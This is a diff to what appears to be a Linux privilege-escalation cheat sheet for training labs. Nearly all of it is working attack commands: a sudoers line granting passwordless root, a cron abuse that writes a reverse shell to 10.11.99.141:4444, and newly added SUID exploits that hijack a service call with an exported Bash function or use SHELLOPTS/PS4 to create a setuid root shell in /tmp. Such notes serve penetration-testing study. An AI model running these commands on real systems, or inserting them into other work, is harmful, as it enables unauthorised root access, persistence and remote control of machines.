@@ -154,7 +154,7 @@ echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
 useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 ```
 ### /etc/crontab ✡️
-#### Cron Jobs - File Permissions 
+#### Cron Jobs - File Permissions 🔆
 ```bash
 cat /etc/crontab
 locate overwrite.sh
@@ -162,7 +162,7 @@ echo '* * * * * root overwrite.sh' >> /etc/crontab
 echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
 echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
 ```
-#### Cron Jobs - PATH Environment Variable 
+#### Cron Jobs - PATH Environment Variable 🔆
 ```bash
 # Check "PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" code in crontab file.
 # If there is a writable directory in "PATH=", inside that directory we create a file with the same name as "overwrite.sh" file and write reverseshell inside it.
@@ -222,7 +222,7 @@ export PATH=/tmp:$PATH
 ### Environment Variables(2) ✡️
 ```bash
 /usr/local/bin/suid-env
-strings /usr/local/bin/suid-env # service apache2 start
+strings /usr/local/bin/suid-env # End file is 'service apache2 start'
 nano /tmp/service
 -------------------
 #!/bin/bash
@@ -233,13 +233,21 @@ export PATH=/tmp:$PATH
 /usr/local/bin/suid-env
 ```
 
-### Abusing Shell Features (#1) ✡️
+### Abusing Shell Features ✡️
 ```bash
-
+/bin/bash --version
 ```
-### Abusing Shell Features (#2) ✡️
+#### If " 'Bash versions' < 4.2-048 " 🔆
 ```bash
-
+strings /usr/local/bin/suid-env2 # End file is '/usr/sbin/service apache2 start'
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+```
+#### If " 'Bash versions' > 4.4 " 🔆
+```bash 
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+/tmp/rootbash -p
 ```
 
 #### The following list shows the most commons file extensions for linux: ❗️☪️
